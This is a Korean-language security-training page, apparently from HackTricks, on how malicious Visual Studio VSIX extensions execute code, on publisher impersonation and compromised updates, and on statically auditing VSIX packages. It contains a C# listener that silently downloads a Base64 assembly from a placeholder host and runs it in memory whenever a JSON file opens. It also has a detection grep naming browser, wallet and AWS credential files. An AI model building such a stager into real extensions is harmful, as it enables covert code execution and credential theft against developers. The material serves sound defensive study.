# Visual Studio VSIX Extension Abuse

{{#include ../banners/hacktricks-training.md}}

Visual Studio extension은 일반적인 편집기 작업을 통해 로그인한 사용자의 ID로 코드를 실행할 수 있습니다. 악성 VSIX, 유사한 게시자 또는 침해된 확장 프로그램 업데이트는 일반적인 설치 경로를 통해 사용자에게 전달될 수 있습니다. 관리자 권한 프롬프트를 통해 설치하는 것은 사용자가 동의한 설치 경로이지, 자동 권한 상승이 아닙니다.<sup>[[1]](#references)</sup>

## 실행 모델

기존 VSSDK 확장 프로그램은 일반적으로 `devenv.exe` 내에서 실행됩니다. 최신 `VisualStudio.Extensibility` 모델은 최신 .NET 확장 프로그램을 주로 별도의 프로세스에서 실행합니다. Visual Studio는 전용 `Microsoft.ServiceHub.Host.Extensibility` 프로세스에 대한 호출을 중개하여 IDE 안정성을 격리하지만, 사용자의 Windows 권한으로부터 확장 프로그램을 **샌드박싱하지는 않습니다**. 실행 파일 이름에는 `ServiceHub.Host.Extensibility.arm64.exe`처럼 아키텍처 접미사가 포함될 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### 일반적인 편집기 작업에 반응

눈에 띄는 메뉴 명령만 제공하는 대신, 확장 프로그램은 `ITextViewOpenClosedListener`를 구현할 수 있습니다. `TextViewOpenedAsync` 콜백은 일치하는 문서에서 호출되며, `TextViewExtensionConfiguration.AppliesTo`를 사용하면 JSON 같은 일반적인 형식으로 활성화를 제한할 수 있습니다. 실제 formatter나 linter는 홍보한 작업을 수행하면서 파일을 여는 부수 동작으로 다른 작업을 실행할 수도 있습니다.<sup>[[1]](#references)[[3]](#references)</sup>

다음의 축약된 패턴은 중요한 실행 지점을 보여 줍니다. 이해를 돕기 위해 정상적인 formatter 작업과 오류 처리는 생략했습니다.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>이벤트 트리거 기반 인메모리 managed assembly 로더</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

이 체인은 Base64 텍스트를 다운로드하고, 이를 디코딩해 어셈블리 바이트로 만든 다음, collectible `AssemblyLoadContext`를 통해 `MemoryStream`에서 로드하고, 리플렉션으로 가져온 `EntryPoint`를 매개변수 없이 또는 `string[]`을 전달해 호출하며, 비동기 진입점을 await한 뒤 컨텍스트를 언로드합니다. 두 번째 단계는 디스크에 기록되지 않지만, VSIX와 기본 확장 DLL은 디스크 아티팩트로 남습니다. Base64는 진위성이나 기밀성을 제공하지 않으며, HTTP를 사용하면 경로상 공격자가 응답을 바꿔치기할 수도 있습니다.<sup>[[1]](#references)</sup>

운영상의 변형으로는 스테이징이 실패해도 광고된 기능이 계속 작동하도록 모든 예외를 무시하거나, `ITextViewChangedListener`를 사용해 편집 후 트리거하는 방식이 있습니다. 코드는 확장 호스트에서 실행되며, 해당 사용자가 사용할 수 있는 관리형 API, P/Invoke, 파일, 자격 증명 및 자식 프로세스를 이용할 수 있습니다.<sup>[[1]](#references)</sup>

네이티브 플러그인 자동 로드를 기반으로 하는, 편집기별 관련 실행 표면은 다음을 참조하세요.

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace 및 배포 신뢰 악용

VSIX는 직접 공유되거나 피싱을 통해 전달될 수 있으며, 웹 Marketplace 또는 Visual Studio에 내장된 Marketplace 브라우저를 통해서도 전달될 수 있습니다. 주로 고유성과 예약어 목록만 확인하는 게시자 등록 방식에서는 시각적으로 비슷한 게시자 ID를 만들 수 있습니다. 이미 신뢰받는 게시자나 확장 프로그램을 침해하는 방식은 설치 사용자층을 그대로 물려받으므로 더욱 효과적입니다. Marketplace에서 설치하면 Visual Studio Installer가 실행되고, 다운로드한 VSIX는 일시적으로 `%LOCALAPPDATA%\Temp`에 저장됩니다. `payload.vsix`라는 이름도 정상적으로 사용되므로 파일명만으로는 악성 여부를 판단할 수 없습니다.<sup>[[1]](#references)</sup>

MDSec은 확장 프로그램을 직접 설치하는 Visual Studio URL 프로토콜을 확인하지 못했습니다. 따라서 공격자는 여전히 사용자가 VSIX를 설치하고 신뢰하도록 유도하거나, 기존 확장 프로그램의 배포 경로를 침해해야 합니다. `AllUsers` 패키지는 Visual Studio 설치 폴더에 설치되며 권한 상승을 요청할 수 있지만, 이는 동의를 거치는 일반적인 설치 프로그램 동작이지 관리자나 SYSTEM 권한을 자동으로 얻는 경로는 아닙니다.<sup>[[1]](#references)[[4]](#references)</sup>

### 대규모 정적 감사

VSIX 패키지는 일반적으로 ZIP 컨테이너이므로, 안전한 Marketplace 검토 파이프라인은 패키지를 열거하고 **확장 프로그램 코드를 로드하지 않은 채** 압축을 풀어 매니페스트를 분석하고 실행 표면을 식별한 뒤, `ilspycmd`로 관리형 어셈블리를 디컴파일할 수 있습니다. 일반적인 번들 종속성을 제외한 뒤 확장 프로그램 자체 어셈블리를 우선 조사하고, 자격 증명 저장소 문자열을 파일 읽기와 네트워크 전송, 인코딩과 전송, 다운로드와 실행, 자격 증명 관리자와 네트워크 접근, 스크린샷과 전송 같은 동작 클러스터와 연관 지어 분석합니다.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

또한 모든 실행 표면이 managed code라고 가정하지 말고 native DLL, MSBuild target, script, T4 template, installer payload도 조사하세요. 의심스러운 동작을 manifest에 명시된 목적과 비교하세요. telemetry와 정상적인 updater도 데이터 유출이나 스테이징처럼 보일 수 있습니다. 정적 분석만으로는 패킹되거나 난독화된 코드, 동적으로 확인되는 코드, 휴면 상태의 코드를 놓칠 수 있으며, 최신 버전만 검토하면 과거의 악성 릴리스를 놓칠 수 있습니다.<sup>[[1]](#references)</sup>

별도의 프로젝트 로드 공격은 VSIX를 설치하지 않고도 악성 [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md)을 실행할 수 있습니다.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio 확장 기능 재검토](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility 소개](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX 패키지의 구성](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET 도구](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel 캠페인, 이라크 기반 시설 표적](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
